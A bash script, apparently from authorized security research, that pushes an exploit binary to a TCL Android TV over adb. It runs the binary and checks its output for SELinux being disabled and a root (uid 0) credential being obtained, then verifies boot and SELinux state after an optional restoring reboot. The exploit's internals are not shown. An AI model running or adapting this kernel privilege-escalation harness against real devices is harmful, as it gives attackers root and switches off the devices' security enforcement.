#!/bin/bash
set -euo pipefail

ROOT=$(CDPATH= cd -- "$(dirname -- "$0")/.." && pwd)
BUILD="$ROOT/build/android34"
: "${ADB_TARGET:?Set ADB_TARGET to the authorized TV serial}"
ADB_VENDOR_KEYS=${ADB_VENDOR_KEYS:-${HOME}/.android/adbkey}
REBOOT_AFTER=${REBOOT_AFTER:-1}
export ADB_VENDOR_KEYS

case "$REBOOT_AFTER" in
  0|1) ;;
  *) printf 'REBOOT_AFTER must be 0 or 1\n' >&2; exit 2 ;;
esac

root_name=ghostlock-v643-sabrina-mode7
helper_name=tcl-v643-mcast-helper-mode7

adb -s "$ADB_TARGET" get-state
adb -s "$ADB_TARGET" push "$BUILD/ghostlock-tcl-v643-lab" \
  "/data/local/tmp/$root_name"
adb -s "$ADB_TARGET" push "$BUILD/tcl-v643-mcast-helper" \
  "/data/local/tmp/$helper_name"
adb -s "$ADB_TARGET" shell chmod 755 \
  "/data/local/tmp/$root_name" "/data/local/tmp/$helper_name"

before_boot=$(adb -s "$ADB_TARGET" shell \
  cat /proc/sys/kernel/random/boot_id | tr -d '\r')
printf 'TV_MODE7 before_boot=%s\n' "$before_boot"
sha256sum "$BUILD/ghostlock-tcl-v643-lab" \
  "$BUILD/tcl-v643-mcast-helper"

set +e
mode7_output=$(adb -s "$ADB_TARGET" shell \
  "cd /data/local/tmp && timeout 600 env \
TCL_PERF_WITNESS=1 \
TCL_PERF_WITNESS_ATTEMPTS=5 \
TCL_PERF_RING_LOOPS=20000 \
TCL_MCAST_HELPER=/data/local/tmp/$helper_name \
GHOST_SELINUX=1 GHOST_EXEC=0 GHOST_REBOOT=$REBOOT_AFTER GHOST_MINIMAL=1 \
FOPS_MAX_ATTEMPTS=1 CRED_ATTEMPTS=1 KSNITCH_VERBOSE=0 \
./$root_name --cred" 2>&1)
mode7_rc=$?
set -e
printf '%s\n' "$mode7_output"
printf 'TV_MODE7 command_rc=%d\n' "$mode7_rc"

printf '%s\n' "$mode7_output" | grep -Eq \
  'TCL capture witness: method=perf-regs .*block=[0-9]+ pfn_reference=-1 verdict=1'
printf '%s\n' "$mode7_output" | grep -q \
  'mode 7 armed: plan0 selinux zero, plan1 cred, plan2 real_cred'
printf '%s\n' "$mode7_output" | grep -q \
  'sid: selinux OFF - no SID resolution needed'
printf '%s\n' "$mode7_output" | grep -q \
  '=== ROOT: uid=0 hits=1/1 ==='

if [ "$REBOOT_AFTER" -eq 1 ]; then
  # A successful proof deliberately reboots so the volatile credential and
  # SELinux changes disappear. Wait for Android to come back before validating
  # the restored security state.
  for _ in $(seq 1 120); do
    adb connect "$ADB_TARGET" >/dev/null 2>&1 || true
    if adb -s "$ADB_TARGET" get-state >/dev/null 2>&1; then
      break
    fi
    sleep 2
  done
  adb -s "$ADB_TARGET" get-state
  after_boot=$(adb -s "$ADB_TARGET" shell \
    cat /proc/sys/kernel/random/boot_id | tr -d '\r')
  printf 'TV_MODE7 after_boot=%s\n' "$after_boot"
  test "$before_boot" != "$after_boot"

  post_state=$(adb -s "$ADB_TARGET" shell \
    "printf 'verifiedboot='; getprop ro.boot.verifiedbootstate; \
printf 'vbmeta='; getprop ro.boot.vbmeta.device_state; \
printf 'verity='; getprop ro.boot.veritymode; \
printf 'selinux='; cat /sys/fs/selinux/enforce" | tr -d '\r')
  printf '%s\n' "$post_state"
  printf '%s\n' "$post_state" | grep -q 'verifiedboot=green'
  printf '%s\n' "$post_state" | grep -q 'vbmeta=locked'
  printf '%s\n' "$post_state" | grep -q 'verity=enforcing'
  printf '%s\n' "$post_state" | grep -q 'selinux=1'
  printf 'TV_MODE7 PASS: Sabrina SELinux-off + UID-0 proof completed; reboot restored enforcement\n'
else
  after_boot=$(adb -s "$ADB_TARGET" shell \
    cat /proc/sys/kernel/random/boot_id | tr -d '\r')
  printf 'TV_MODE7 after_boot=%s\n' "$after_boot"
  test "$before_boot" = "$after_boot"

  post_state=$(adb -s "$ADB_TARGET" shell \
    "printf 'verifiedboot='; getprop ro.boot.verifiedbootstate; \
printf 'vbmeta='; getprop ro.boot.vbmeta.device_state; \
printf 'verity='; getprop ro.boot.veritymode; \
printf 'selinux='; cat /sys/fs/selinux/enforce" | tr -d '\r')
  printf '%s\n' "$post_state"
  printf '%s\n' "$post_state" | grep -q 'verifiedboot=green'
  printf '%s\n' "$post_state" | grep -q 'vbmeta=locked'
  printf '%s\n' "$post_state" | grep -q 'verity=enforcing'
  printf '%s\n' "$post_state" | grep -q 'selinux=0'
  printf 'TV_MODE7 PASS: Sabrina proof completed without reboot; SELinux remains disabled until reboot\n'
fi
